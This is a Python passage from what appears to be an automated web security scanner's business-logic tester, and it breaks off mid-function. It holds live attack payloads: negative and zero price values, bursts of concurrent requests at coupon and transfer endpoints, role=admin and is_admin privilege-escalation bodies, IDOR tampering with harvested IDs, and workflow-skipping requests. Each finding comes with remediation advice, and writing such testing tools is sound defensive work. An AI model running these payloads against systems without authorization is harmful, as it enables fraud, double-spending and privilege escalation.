"""
Business Logic Vulnerability Tester

Tests for logical flaws that automated scanners typically miss:
1. Price/Quantity Manipulation — negative values, zero prices, decimal precision
2. Race Conditions — concurrent requests to state-changing endpoints
3. Workflow Bypass — skip steps in multi-step flows
4. Parameter Tampering — role escalation, status manipulation
5. Rate Limit Bypass — rapid requests with slight variations
6. HTTP Method Override — X-HTTP-Method-Override, _method parameter
"""
import asyncio
import logging
import time
import json
import re
from urllib.parse import urljoin, urlparse

import httpx

from app.utils.http_client import make_client
from app.utils.url_utils import is_static_url, is_transactional_url

logger = logging.getLogger(__name__)

# Keywords for identifying endpoint categories
PRICE_KEYWORDS = ("price", "amount", "quantity", "total", "discount", "count",
                  "cost", "subtotal", "fee", "charge", "sum", "value")
CART_KEYWORDS = ("cart", "checkout", "payment", "order", "purchase", "buy",
                 "billing", "pay", "basket", "invoice")
RACE_KEYWORDS = ("coupon", "voucher", "transfer", "redeem", "claim", "vote",
                 "like", "reward", "bonus", "promo", "apply", "withdraw",
                 "send", "deposit")
WORKFLOW_PATTERNS = [
    re.compile(r"step[_\-]?(\d+)", re.IGNORECASE),
    re.compile(r"stage[_\-]?(\d+)", re.IGNORECASE),
    re.compile(r"phase[_\-]?(\d+)", re.IGNORECASE),
    re.compile(r"/(\d+)(?:/|$)"),  # /checkout/1, /checkout/2
]
SENSITIVE_ENDPOINTS = ("login", "signin", "sign-in", "password", "reset",
                       "otp", "verify", "2fa", "mfa", "token", "auth",
                       "forgot")
PRIVILEGE_PARAMS = ("role", "is_admin", "admin", "type", "status", "plan",
                    "tier", "level", "permission", "group", "privilege",
                    "user_type", "account_type")
DESTRUCTIVE_KEYWORDS = ("delete", "destroy", "remove", "purge", "wipe",
                        "terminate", "erase", "drop")

# NOTE: Static extension and non-transactional path filtering now uses
# app.utils.url_utils (is_static_url, is_transactional_url)

# Response body keywords that indicate a transactional context
TRANSACTIONAL_INDICATORS = (
    "price", "total", "cart", "order", "amount", "subtotal", "checkout",
    "payment", "invoice", "billing", "charge", "fee", "cost", "$", "€",
    "£", "¥", "discount", "quantity",
)

UPLOAD_KEYWORDS = ("upload", "file", "attach", "import", "image", "avatar",
                   "photo", "document", "media", "cv", "resume")
SEARCH_KEYWORDS = ("search", "query", "q", "keyword", "filter", "sort",
                   "order", "find", "lookup", "term", "s", "text")
REGISTRATION_KEYWORDS = ("register", "signup", "sign-up", "create-account",
                         "join", "enroll")
VERIFY_KEYWORDS = ("verify", "confirm", "activate", "validate", "email")


class BusinessLogicTester:
    def __init__(self, context: dict):
        self.context = context
        self.base_url = context.get("base_url", "")
        self.endpoints = context.get("endpoints", [])
        self.auth_cookie = context.get("auth_cookie")
        self.session_cookies = context.get("session_cookies", {})
        self.auth_headers_ctx = context.get("auth_headers", {})
        self.harvested_tokens = context.get("harvested_tokens", {})
        self.rate_limit = self.context.get("rate_limit") or 5
        self.semaphore = asyncio.Semaphore(self.rate_limit)
        self.findings: list[dict] = []
        self.headers = self._build_headers()

    def _build_headers(self) -> dict:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/120.0.0.0 Safari/537.36",
        }
        # Use auth_headers from stateful_crawl if available
        if self.auth_headers_ctx:
            headers.update(self.auth_headers_ctx)
        # Build cookie from session_cookies or auth_cookie
        if self.session_cookies:
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.session_cookies.items())
        elif self.auth_cookie:
            if self.auth_cookie.startswith("token="):
                headers["Authorization"] = f"Bearer {self.auth_cookie.split('=', 1)[1]}"
            else:
                headers["Cookie"] = self.auth_cookie
        return headers

    def _normalize_endpoint(self, ep) -> dict:
        """Normalize endpoint to dict with url, method, form_fields."""
        if isinstance(ep, str):
            return {"url": ep, "method": "GET", "form_fields": [], "params": {}}
        return {
            "url": ep.get("url", ""),
            "method": ep.get("method", "GET").upper(),
            "form_fields": ep.get("form_fields", []),
            "params": ep.get("params", {}),
        }

    def _resolve_url(self, url: str) -> str:
        if url.startswith(("http://", "https://")):
            return url
        return urljoin(self.base_url, url)

    def _is_destructive(self, url: str) -> bool:
        url_lower = url.lower()
        return any(kw in url_lower for kw in DESTRUCTIVE_KEYWORDS)

    def _is_static_or_informational(self, url: str) -> bool:
        """Return True if URL points to a static asset or non-transactional page."""
        return not is_transactional_url(url)

    def _make_finding(
        self,
        title: str,
        severity: str,
        url: str,
        method: str,
        parameter: str | None,
        description: str,
        impact: str,
        remediation: str,
        payload_used: str,
        confidence: float,
        request_data: dict | None = None,
        response_data: dict | None = None,
    ) -> dict:
        return {
            "title": title,
            "vuln_type": "business_logic",
            "severity": severity,
            "url": url,
            "method": method,
            "parameter": parameter,
            "description": description,
            "impact": impact,
            "remediation": remediation,
            "payload_used": payload_used,
            "request_data": request_data,
            "response_data": response_data,
            "ai_confidence": confidence,
        }

    async def test(self) -> list[dict]:
        """Run all business logic tests and return findings."""
        logger.info(f"BusinessLogicTester: Starting tests on {self.base_url} "
                     f"with {len(self.endpoints)} endpoints")
        start = time.time()

        test_methods = [
            ("Price/Quantity Manipulation", self._test_price_manipulation),
            ("Race Conditions", self._test_race_conditions),
            ("Workflow Bypass", self._test_workflow_bypass),
            ("Parameter Tampering", self._test_parameter_tampering),
            ("Rate Limit Bypass", self._test_rate_limit_bypass),
            ("HTTP Method Override", self._test_method_override),
            ("CSRF Protection", self._test_csrf_bypass),
            ("File Upload", self._test_file_upload),
            ("Email Verification Bypass", self._test_email_verification_bypass),
            ("Search/Filter Injection", self._test_search_injection),
            ("Stored XSS in Profiles/Orders", self._test_stored_xss),
        ]

        for name, method in test_methods:
            logger.info(f"BusinessLogicTester: Starting {name}")
            try:
                results = await method()
                self.findings.extend(results)
                logger.info(f"BusinessLogicTester: {name} complete — "
                            f"{len(results)} findings")
            except Exception as e:
                logger.error(f"BusinessLogicTester: {name} failed: {e}",
                             exc_info=True)

        elapsed = time.time() - start
        logger.info(f"BusinessLogicTester: All tests complete in {elapsed:.1f}s — "
                     f"{len(self.findings)} total findings")
        return self.findings

    # ─── 1. Price/Quantity Manipulation ───────────────────────────────

    async def _test_price_manipulation(self) -> list[dict]:
        findings = []
        targets = self._find_price_endpoints()
        if not targets:
            logger.info("BusinessLogicTester: No price/cart endpoints found")
            return findings

        max_price_findings = 2
        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
            for target in targets[:10]:
                if len(findings) >= max_price_findings:
                    break
                try:
                    results = await self._test_price_endpoint(client, target)
                    findings.extend(results)
                except Exception as e:
                    logger.warning(f"Price test failed for {target['url']}: {e}")
        return findings[:max_price_findings]

    def _find_price_endpoints(self) -> list[dict]:
        targets = []
        seen_urls = set()

        for ep in self.endpoints:
            norm = self._normalize_endpoint(ep)
            url_lower = norm["url"].lower()

            # Skip static assets and informational pages
            if self._is_static_or_informational(norm["url"]):
                continue

            is_cart = any(kw in url_lower for kw in CART_KEYWORDS)
            has_price_params = any(
                kw in (f.lower() if isinstance(f, str) else f.get("name", "").lower())
                for f in norm["form_fields"]
                for kw in PRICE_KEYWORDS
            ) if norm["form_fields"] else False

            # URL keyword matching ONLY for POST/PUT/PATCH endpoints or those
            # with form fields — plain GET pages with "price" in URL are not
            # transactional endpoints
            if not has_price_params and norm["method"] in ("POST", "PUT", "PATCH"):
                has_price_params = any(
                    kw in url_lower for kw in PRICE_KEYWORDS
                )

            if is_cart or has_price_params:
                targets.append(norm)
                seen_urls.add(norm["url"])

        # --- Enrich from stateful crawler forms ---
        crawl_data = self.context.get("stateful_crawl", {})
        for form in crawl_data.get("forms", []):
            form_url = form.get("action") or form.get("url", "")
            if form_url in seen_urls:
                continue
            if self._is_static_or_informational(form_url):
                continue
            fields = form.get("fields", [])
            field_names = [
                (f if isinstance(f, str) else f.get("name", "")).lower()
                for f in fields
            ]
            has_price_field = any(
                kw in fname for fname in field_names for kw in PRICE_KEYWORDS
            )
            if has_price_field:
                targets.append({
                    "url": form_url,
                    "method": (form.get("method") or "POST").upper(),
                    "form_fields": fields,
                    "params": {},
                })
                seen_urls.add(form_url)

        # --- Enrich from application graph entities ---
        app_graph = self.context.get("application_graph", {})
        for entity in app_graph.get("entities", []):
            if isinstance(entity, str):
                continue
            entity_type = (entity.get("type") or entity.get("name", "")).lower()
            if any(kw in entity_type for kw in ("payment", "order", "cart",
                                                  "invoice", "checkout", "billing")):
                for ep_url in entity.get("endpoints", []):
                    if isinstance(ep_url, str) and ep_url not in seen_urls:
                        if self._is_static_or_informational(ep_url):
                            continue
                        targets.append({
                            "url": ep_url,
                            "method": "POST",
                            "form_fields": entity.get("fields", []),
                            "params": {},
                        })
                        seen_urls.add(ep_url)

        return targets

    async def _test_price_endpoint(self, client: httpx.AsyncClient,
                                   target: dict) -> list[dict]:
        findings = []
        url = self._resolve_url(target["url"])

        # Identify numeric fields
        numeric_fields = []
        for f in target["form_fields"]:
            name = f if isinstance(f, str) else f.get("name", "")
            if any(kw in name.lower() for kw in PRICE_KEYWORDS):
                numeric_fields.append(name)

        # If no explicit fields, infer from URL keywords
        if not numeric_fields:
            for kw in PRICE_KEYWORDS:
                if kw in target["url"].lower():
                    numeric_fields.append(kw)
                    break
            if not numeric_fields:
                numeric_fields = ["quantity", "price"]

        test_values = [
            ("-1", "negative value", "high"),
            ("0", "zero value", "medium"),
            ("0.001", "precision attack", "medium"),
            ("99999999", "extremely large number", "medium"),
            ("-99999999", "large negative number", "high"),
        ]

        for field in numeric_fields[:3]:
            # --- BASELINE REQUEST: send normal value first ---
            baseline_body = {field: "1"}
            for f in target["form_fields"]:
                fname = f if isinstance(f, str) else f.get("name", "")
                if fname != field:
                    baseline_body.setdefault(fname, "1")

            try:
                async with self.semaphore:
                    baseline_resp = await client.post(url, json=baseline_body)
                baseline_status = baseline_resp.status_code
                baseline_text = baseline_resp.text[:2000]
                baseline_ct = (baseline_resp.headers.get("content-type") or "").lower()
            except Exception:
                continue

            # If baseline returns HTML with no transactional evidence, skip
            # this endpoint entirely — it's not a real commerce endpoint
            if "text/html" in baseline_ct:
                baseline_lower = baseline_text.lower()
                has_transactional = any(
                    ind in baseline_lower for ind in TRANSACTIONAL_INDICATORS
                )
                if not has_transactional:
                    logger.debug(
                        f"Price test: skipping {url} — HTML response with no "
                        f"transactional indicators"
                    )
                    continue

            for test_val, desc, severity in test_values:
                async with self.semaphore:
                    try:
                        body = {field: test_val}
                        # Add dummy values for other common fields
                        for f in target["form_fields"]:
                            fname = f if isinstance(f, str) else f.get("name", "")
                            if fname != field:
                                body.setdefault(fname, "1")

                        resp = await client.post(url, json=body)

                        if resp.status_code in (200, 201, 202):
                            resp_text = resp.text[:2000]
                            resp_ct = (resp.headers.get("content-type") or "").lower()

                            # Skip if response is HTML with no transactional content
                            if "text/html" in resp_ct:
                                resp_lower = resp_text.lower()
                                has_transactional = any(
                                    ind in resp_lower
                                    for ind in TRANSACTIONAL_INDICATORS
                                )
                                if not has_transactional:
                                    continue

                            # Check for signs the server accepted the value
                            accepted = (
                                resp.status_code in (200, 201) and
                                "error" not in resp_text.lower()[:500] and
                                "invalid" not in resp_text.lower()[:500] and
                                "must be" not in resp_text.lower()[:500]
                            )
                            if not accepted:
                                continue

                            # --- BASELINE COMPARISON ---
                            # Responses must differ meaningfully: different
                            # status code OR body differs by >10%
                            status_differs = resp.status_code != baseline_status
                            body_diff_ratio = (
                                abs(len(resp_text) - len(baseline_text))
                                / max(len(baseline_text), 1)
                            )
                            responses_differ = status_differs or body_diff_ratio > 0.10

                            if not responses_differ:
                                # Server returned the same response for normal
                                # and manipulated values — likely ignoring the
                                # parameter entirely, not a real vuln
                                continue

                            # Check if the manipulated value appears in response
                            value_reflected = test_val in resp_text
                            # Negative or zero in financial context = likely vuln
                            is_financial = any(
                                kw in field.lower()
                                for kw in ("price", "amount", "total", "cost",
                                           "charge", "fee")
                            )
                            if value_reflected or is_financial:
                                confidence = 0.85 if value_reflected else 0.6
                                findings.append(self._make_finding(
                                    title=f"Price Manipulation: {desc} accepted "
                                          f"for '{field}'",
                                    severity=severity,
                                    url=url,
                                    method="POST",
                                    parameter=field,
                                    description=(
                                        f"The endpoint accepted {desc} ({test_val}) "
                                        f"for the '{field}' parameter without "
                                        f"proper server-side validation. "
                                        f"Response status: {resp.status_code}. "
                                        f"Baseline comparison: status "
                                        f"{baseline_status}, body size diff "
                                        f"{body_diff_ratio:.0%}."
                                    ),
                                    impact=(
                                        "Attackers could manipulate prices, "
                                        "quantities, or totals to purchase items "
                                        "for free, get negative charges (refunds), "
                                        "or cause integer overflow issues."
                                    ),
                                    remediation=(
                                        "Implement strict server-side validation "
                                        "for all numeric parameters. Enforce "
                                        "minimum/maximum bounds. Never trust "
                                        "client-supplied prices — recalculate "
                                        "totals server-side."
                                    ),
                                    payload_used=json.dumps(body),
                                    confidence=confidence,
                                    request_data={"body": body, "method": "POST"},
                                    response_data={
                                        "status": resp.status_code,
                                        "snippet": resp_text[:500],
                                        "baseline_status": baseline_status,
                                        "body_diff_ratio": round(body_diff_ratio, 3),
                                    },
                                ))
                                break  # One finding per field is enough
                    except httpx.TimeoutException:
                        pass
                    except Exception as e:
                        logger.debug(f"Price test error on {url}: {e}")
        return findings

    # ─── 2. Race Conditions ──────────────────────────────────────────

    async def _test_race_conditions(self) -> list[dict]:
        findings = []
        targets = self._find_race_targets()
        if not targets:
            logger.info("BusinessLogicTester: No race condition targets found")
            return findings

        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
            for target in targets[:6]:
                try:
                    result = await self._test_race_endpoint(client, target)
                    if result:
                        findings.append(result)
                except Exception as e:
                    logger.warning(f"Race test failed for {target['url']}: {e}")
        return findings

    def _find_race_targets(self) -> list[dict]:
        targets = []
        seen_urls = set()

        for ep in self.endpoints:
            norm = self._normalize_endpoint(ep)
            if self._is_destructive(norm["url"]):
                continue
            if self._is_static_or_informational(norm["url"]):
                continue
            url_lower = norm["url"].lower()
            method = norm["method"]
            if method in ("POST", "PUT", "PATCH") or any(
                kw in url_lower for kw in RACE_KEYWORDS
            ):
                category = "generic"
                for kw in RACE_KEYWORDS:
                    if kw in url_lower:
                        category = kw
                        break
                targets.append({**norm, "category": category})
                seen_urls.add(norm["url"])

        # --- Enrich from stateful crawler multi-step flows ---
        crawl_data = self.context.get("stateful_crawl", {})
        for flow in crawl_data.get("multi_step_flows", []):
            for step in flow.get("steps", []):
                step_url = step.get("url", "")
                step_method = (step.get("method") or "POST").upper()
                if step_url in seen_urls or step_method == "GET":
                    continue
                if self._is_destructive(step_url):
                    continue
                url_lower = step_url.lower()
                # State-changing flow endpoints are race-prone
                category = "generic"
                for kw in RACE_KEYWORDS:
                    if kw in url_lower:
                        category = kw
                        break
                # Flows involving payment/redeem/claim get higher priority
                flow_name = (flow.get("name") or flow.get("type", "")).lower()
                if any(kw in flow_name for kw in ("payment", "coupon", "redeem",
                                                    "transfer", "checkout")):
                    category = next(
                        (kw for kw in ("coupon", "transfer", "redeem", "claim")
                         if kw in flow_name), category
                    )
                targets.append({
                    "url": step_url,
                    "method": step_method,
                    "form_fields": step.get("fields", []),
                    "params": step.get("params", {}),
                    "category": category,
                })
                seen_urls.add(step_url)

        # --- Enrich from application graph attack paths ---
        app_graph = self.context.get("application_graph", {})
        for path in app_graph.get("attack_paths", []):
            path_type = (path.get("type") or path.get("name", "")).lower()
            if any(kw in path_type for kw in ("payment", "coupon", "redeem",
                                                "transfer", "checkout", "race")):
                for ep_url in path.get("endpoints", []):
                    if isinstance(ep_url, str) and ep_url not in seen_urls:
                        if self._is_destructive(ep_url):
                            continue
                        category = next(
                            (kw for kw in RACE_KEYWORDS if kw in ep_url.lower()),
                            next((kw for kw in RACE_KEYWORDS if kw in path_type),
                                 "generic"),
                        )
                        targets.append({
                            "url": ep_url,
                            "method": "POST",
                            "form_fields": [],
                            "params": {},
                            "category": category,
                        })
                        seen_urls.add(ep_url)

        # Prioritize known race-prone categories
        priority = {kw: i for i, kw in enumerate(RACE_KEYWORDS)}
        targets.sort(key=lambda t: priority.get(t["category"], 99))
        return targets

    async def _test_race_endpoint(self, client: httpx.AsyncClient,
                                  target: dict) -> dict | None:
        url = self._resolve_url(target["url"])
        concurrent = 10

        # Build request body from form fields
        body = {}
        for f in target["form_fields"]:
            name = f if isinstance(f, str) else f.get("name", "")
            body[name] = "test"

        # First, send a baseline request to get normal response
        try:
            baseline = await client.request(
                target["method"], url, json=body if body else None
            )
            baseline_status = baseline.status_code
        except Exception:
            return None

        # Fire concurrent requests
        async def _fire():
            try:
                return await client.request(
                    target["method"], url, json=body if body else None
                )
            except Exception:
                return None

        tasks = [_fire() for _ in range(concurrent)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        # Analyze responses
        success_count = 0
        status_codes = []
        for r in responses:
            if isinstance(r, Exception) or r is None:
                continue
            status_codes.append(r.status_code)
            if r.status_code in (200, 201, 202):
                success_count += 1

        if not status_codes:
            return None

        # Indicators of race condition:
        # 1. All concurrent requests succeeded (should only allow one)
        # 2. More successes than expected for idempotent operations
        all_same_success = (
            success_count >= concurrent * 0.8 and
            baseline_status in (200, 201, 202)
        )

        # Check for varied responses (some succeed, some fail = race window)
        unique_statuses = set(status_codes)
        mixed_responses = (
            len(unique_statuses) > 1 and
            success_count >= 2 and
            any(s >= 400 for s in status_codes)
        )

        if all_same_success or mixed_responses:
            severity = "high" if target["category"] in (
                "coupon", "transfer", "redeem", "claim", "withdraw",
                "deposit", "send"
            ) else "medium"
            confidence = 0.7 if all_same_success else 0.55

            return self._make_finding(
                title=f"Race Condition: {target['category']} endpoint accepts "
                      f"concurrent requests",
                severity=severity,
                url=url,
                method=target["method"],
                parameter=None,
                description=(
                    f"Sent {concurrent} concurrent {target['method']} requests "
                    f"to {url}. {success_count}/{concurrent} succeeded "
                    f"(statuses: {dict((s, status_codes.count(s)) for s in unique_statuses)}). "
                    f"This suggests the endpoint lacks proper concurrency "
                    f"control (mutex/locking)."
                ),
                impact=(
                    "Attackers can exploit race conditions to redeem coupons "
                    "multiple times, double-spend funds, bypass usage limits, "
                    "or create duplicate resources."
                ),
                remediation=(
                    "Implement database-level locking (SELECT FOR UPDATE), "
                    "use idempotency keys, or apply distributed locks (Redis) "
                    "for state-changing operations. Ensure atomic operations "
                    "for financial transactions."
                ),
                payload_used=f"{concurrent}x concurrent {target['method']} {url}",
                confidence=confidence,
                request_data={
                    "concurrent_requests": concurrent,
                    "body": body or None,
                },
                response_data={
                    "success_count": success_count,
                    "status_distribution": {
                        str(s): status_codes.count(s) for s in unique_statuses
                    },
                },
            )
        return None

    # ─── 3. Workflow Bypass ──────────────────────────────────────────

    async def _test_workflow_bypass(self) -> list[dict]:
        findings = []
        workflows = self._detect_workflows()
        if not workflows:
            logger.info("BusinessLogicTester: No multi-step workflows detected")
            return findings

        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
            for name, steps in workflows.items():
                try:
                    results = await self._test_workflow(client, name, steps)
                    findings.extend(results)
                except Exception as e:
                    logger.warning(f"Workflow test failed for {name}: {e}")
        return findings

    def _detect_workflows(self) -> dict[str, list[dict]]:
        """Group endpoints into multi-step workflows."""
        workflows: dict[str, list[tuple[int, dict]]] = {}

        for ep in self.endpoints:
            norm = self._normalize_endpoint(ep)
            url = norm["url"]

            for pattern in WORKFLOW_PATTERNS:
                match = pattern.search(url)
                if match:
                    step_num = int(match.group(1))
                    # Extract workflow name from URL prefix
                    prefix = url[:match.start()].rstrip("/").rsplit("/", 1)[-1]
                    if not prefix:
                        prefix = urlparse(url).path.split("/")[1] if "/" in urlparse(url).path else "flow"
                    key = prefix.lower()
                    if key not in workflows:
                        workflows[key] = []
                    workflows[key].append((step_num, norm))
                    break

        # Also detect sequential endpoints by naming convention
        # e.g., /checkout/shipping, /checkout/payment, /checkout/confirm
        checkout_like: dict[str, list[dict]] = {}
        for ep in self.endpoints:
            norm = self._normalize_endpoint(ep)
            path = urlparse(norm["url"]).path
            parts = [p for p in path.split("/") if p]
            if len(parts) >= 2:
                base = parts[-2].lower()
                if base in ("checkout", "register", "signup", "onboarding",
                            "setup", "wizard", "verification", "kyc"):
                    if base not in checkout_like:
                        checkout_like[base] = []
                    checkout_like[base].append(norm)

        # Only keep workflows with 2+ steps
        result = {}
        for key, steps in workflows.items():
            steps.sort(key=lambda x: x[0])
            if len(steps) >= 2:
                result[key] = [s[1] for s in steps]

        for key, eps in checkout_like.items():
            if len(eps) >= 2 and key not in result:
                result[key] = eps

        # --- Enrich from stateful crawler multi-step flows ---
        # The crawler has already mapped actual step sequences — use them
        # directly instead of relying solely on URL pattern detection.
        crawl_data = self.context.get("stateful_crawl", {})
        for flow in crawl_data.get("multi_step_flows", []):
            flow_name = (flow.get("name") or flow.get("type", "flow")).lower()
            flow_name = re.sub(r"[^a-z0-9_]", "_", flow_name).strip("_")
            if flow_name in result:
                continue
            steps_list = flow.get("steps", [])
            if len(steps_list) < 2:
                continue
            normalized_steps = []
            for step in steps_list:
                step_url = step.get("url", "")
                if not step_url:
                    continue
                normalized_steps.append({
                    "url": step_url,
                    "method": (step.get("method") or "GET").upper(),
                    "form_fields": step.get("fields", []),
                    "params": step.get("params", {}),
                })
            if len(normalized_steps) >= 2:
                result[flow_name] = normalized_steps

        return result

    async def _test_workflow(self, client: httpx.AsyncClient, name: str,
                             steps: list[dict]) -> list[dict]:
        findings = []

        # Test: skip to last step directly
        last_step = steps[-1]
        last_url = self._resolve_url(last_step["url"])

        async with self.semaphore:
            try:
                resp = await client.request(
                    last_step.get("method", "GET"), last_url
                )
                if resp.status_code in (200, 201, 202):
                    resp_text = resp.text[:1000].lower()
                    # If we got a success page (not a redirect to step 1)
                    no_redirect_back = not any(
                        s in resp_text
                        for s in ("step1", "step_1", "start over", "begin",
                                  "first step")
                    )
                    if no_redirect_back:
                        findings.append(self._make_finding(
                            title=f"Workflow Bypass: Skipped to final step "
                                  f"in '{name}' flow",
                            severity="high",
                            url=last_url,
                            method=last_step.get("method", "GET"),
                            parameter=None,
                            description=(
                                f"Directly accessed the final step of the "
                                f"'{name}' workflow ({last_url}) without "
                                f"completing preceding steps. The server "
                                f"returned HTTP {resp.status_code} instead "
                                f"of redirecting to step 1 or returning 403."
                            ),
                            impact=(
                                "Attackers can bypass required validation "
                                "steps (e.g., skip payment in checkout, "
                                "bypass identity verification, skip email "
                                "confirmation during registration)."
                            ),
                            remediation=(
                                "Track workflow state server-side (e.g., in "
                                "session). Verify each step's prerequisites "
                                "before allowing access. Return 403 or "
                                "redirect to the correct step if prerequisites "
                                "are not met."
                            ),
                            payload_used=f"Direct access to {last_url}",
                            confidence=0.65,
                            response_data={
                                "status": resp.status_code,
                                "snippet": resp.text[:300],
                            },
                        ))
            except httpx.TimeoutException:
                pass
            except Exception as e:
                logger.debug(f"Workflow bypass test error: {e}")

        # Test: access step 1 after step 3 (reverse flow)
        if len(steps) >= 3:
            first_url = self._resolve_url(steps[0]["url"])
            async with self.semaphore:
                try:
                    # First go to last step
                    await client.request(last_step.get("method", "GET"), last_url)
                    # Then try going back to step 1
                    resp = await client.request(
                        steps[0].get("method", "GET"), first_url
                    )
                    if resp.status_code in (200, 201, 202):
                        findings.append(self._make_finding(
                            title=f"Workflow Replay: Can re-enter '{name}' "
                                  f"flow after completion",
                            severity="medium",
                            url=first_url,
                            method=steps[0].get("method", "GET"),
                            parameter=None,
                            description=(
                                f"After accessing the final step of the "
                                f"'{name}' workflow, step 1 ({first_url}) is "
                                f"still accessible. This may allow replaying "
                                f"the workflow multiple times."
                            ),
                            impact=(
                                "Workflow replay can allow redeeming offers "
                                "multiple times, creating duplicate orders, "
                                "or re-triggering one-time actions."
                            ),
                            remediation=(
                                "Invalidate or mark workflow as completed "
                                "server-side after the final step. Prevent "
                                "re-entry once the flow is done."
                            ),
                            payload_used=(
                                f"Access {last_url} then {first_url}"
                            ),
                            confidence=0.5,
                        ))
                except Exception:
                    pass

        return findings

    # ─── 4. Parameter Tampering ──────────────────────────────────────

    async def _test_parameter_tampering(self) -> list[dict]:
        findings = []

        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
            # Test privilege escalation params on all POST/PUT endpoints
            state_changing = [
                self._normalize_endpoint(ep) for ep in self.endpoints
                if self._normalize_endpoint(ep)["method"] in ("POST", "PUT", "PATCH")
                and not self._is_destructive(
                    self._normalize_endpoint(ep)["url"]
                )
            ]

            for target in state_changing[:12]:
                try:
                    results = await self._test_param_tamper(client, target)
                    findings.extend(results)
                except Exception as e:
                    logger.warning(
                        f"Param tamper test failed for {target['url']}: {e}"
                    )
        return findings

    async def _test_param_tamper(self, client: httpx.AsyncClient,
                                 target: dict) -> list[dict]:
        findings = []
        url = self._resolve_url(target["url"])

        # Privilege escalation payloads
        priv_payloads = [
            {"role": "admin"},
            {"is_admin": True},
            {"is_admin": "true"},
            {"type": "premium"},
            {"status": "approved"},
            {"user_type": "administrator"},
            {"permission": "all"},
            {"level": "0"},
            {"group": "admin"},
            {"verified": True},
            {"approved": True},
        ]

        # --- Enrich payloads from application graph entities ---
        app_graph = self.context.get("application_graph", {})
        for entity in app_graph.get("entities", []):
            if isinstance(entity, str):
                continue
            entity_type = (entity.get("type") or entity.get("name", "")).lower()
            if any(kw in entity_type for kw in ("user", "account", "profile",
                                                  "member", "role")):
                for field in entity.get("fields", []):
                    fname = (field if isinstance(field, str)
                             else field.get("name", "")).lower()
                    if fname in PRIVILEGE_PARAMS and not any(
                        fname in p for p in priv_payloads
                    ):
                        priv_payloads.append({fname: "admin"})

        # --- Use harvested real IDs for IDOR-style tampering ---
        crawl_data = self.context.get("stateful_crawl", {})
        harvested_ids = crawl_data.get("harvested_ids", [])
        if harvested_ids:
            # Add user_id / account_id payloads with real IDs
            sample_id = harvested_ids[0] if harvested_ids else "1"
            for id_param in ("user_id", "account_id", "owner_id", "uid"):
                priv_payloads.append({id_param: str(sample_id)})

        # Build base body from form fields
        base_body = {}
        for f in target["form_fields"]:
            name = f if isinstance(f, str) else f.get("name", "")
            base_body[name] = "test"

        # First, get baseline response
        async with self.semaphore:
            try:
                baseline = await client.request(
                    target["method"], url, json=base_body if base_body else None
                )
                baseline_status = baseline.status_code
                baseline_len = len(baseline.text)
            except Exception:
                return findings

        # Test each privilege payload
        for payload in priv_payloads:
            tampered_body = {**base_body, **payload}
            async with self.semaphore:
                try:
                    resp = await client.request(
                        target["method"], url, json=tampered_body
                    )
                    if resp.status_code in (200, 201, 202):
                        resp_text = resp.text[:2000].lower()
                        param_name = list(payload.keys())[0]
                        param_val = str(list(payload.values())[0])

                        # Signs the parameter was accepted
                        accepted = (
                            "error" not in resp_text[:300] and
                            "unauthorized" not in resp_text[:300] and
                            "forbidden" not in resp_text[:300] and
                            "invalid" not in resp_text[:300]
                        )

                        # Significant response difference from baseline
                        diff_response = (
                            resp.status_code != baseline_status or
                            abs(len(resp.text) - baseline_len) > 200
                        )

                        if accepted and diff_response:
                            findings.append(self._make_finding(
                                title=(
                                    f"Parameter Tampering: '{param_name}="
                                    f"{param_val}' accepted"
                                ),
                                severity="high",
                                url=url,
                                method=target["method"],
                                parameter=param_name,
                                description=(
                                    f"Injected '{param_name}={param_val}' "
                                    f"into the request body. The server "
                                    f"responded with HTTP {resp.status_code} "
                                    f"and a different response than baseline "
                                    f"({baseline_status}, "
                                    f"len diff: {abs(len(resp.text) - baseline_len)}). "
                                    f"The parameter may be processed without "
                                    f"server-side authorization checks."
                                ),
                                impact=(
                                    "Attackers could escalate privileges to "
                                    "admin, bypass approval workflows, or "
                                    "access premium features without payment."
                                ),
                                remediation=(
                                    "Never trust client-supplied role/status "
                                    "parameters. Enforce authorization "
                                    "server-side. Use an allowlist for "
                                    "writable fields (mass assignment "
                                    "protection)."
                                ),
                                payload_used=json.dumps(tampered_body),
                                confidence=0.65,
                                request_data={"body": tampered_body},
                                response_data={
                                    "status": resp.status_code,
                                    "baseline_status": baseline_status,
                                    "len_diff": abs(
                                        len(resp.text) - baseline_len
                                    ),
                                    "snippet": resp.text[:300],
                                },
                            ))
                            break  # One finding per endpoint is enough
                except httpx.TimeoutException:
                    pass
                except Exception as e:
                    logger.debug(f"Param tamper error: {e}")

        return findings

    # ─── 5. Rate Limit Bypass ────────────────────────────────────────

    async def _test_rate_limit_bypass(self) -> list[dict]:
        findings = []
        targets = self._find_sensitive_endpoints()
        if not targets:
            logger.info("BusinessLogicTester: No sensitive endpoints for "
                        "rate limit testing")
            return findings

        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
            for target in targets[:5]:
                try:
                    result = await self._test_rate_limit(client, target)
                    if result:
                        findings.append(result)
                except Exception as e:
                    logger.warning(
                        f"Rate limit test failed for {target['url']}: {e}"
                    )
        return findings

    def _find_sensitive_endpoints(self) -> list[dict]:
        targets = []
        seen_urls = set()

        for ep in self.endpoints:
            norm = self._normalize_endpoint(ep)
            url_lower = norm["url"].lower()
            if any(kw in url_lower for kw in SENSITIVE_ENDPOINTS):
                targets.append(norm)
                seen_urls.add(norm["url"])

        # --- Enrich from stateful crawler authenticated endpoints ---
        # Auth-gated endpoints are prime rate-limit test targets
        crawl_data = self.context.get("stateful_crawl", {})
        for ep in crawl_data.get("authenticated_endpoints", []):
            ep_url = ep.get("url", "") if isinstance(ep, dict) else ep
            if ep_url in seen_urls:
                continue
            url_lower = ep_url.lower()
            # Include auth-gated endpoints that match sensitive keywords
            # or any endpoint requiring authentication (login, API tokens, etc.)
            is_sensitive = any(kw in url_lower for kw in SENSITIVE_ENDPOINTS)
            is_auth_gated = isinstance(ep, dict) and ep.get("requires_auth", False)
            if is_sensitive or is_auth_gated:
                targets.append({
                    "url": ep_url,
                    "method": (ep.get("method", "POST") if isinstance(ep, dict)
                               else "POST"),
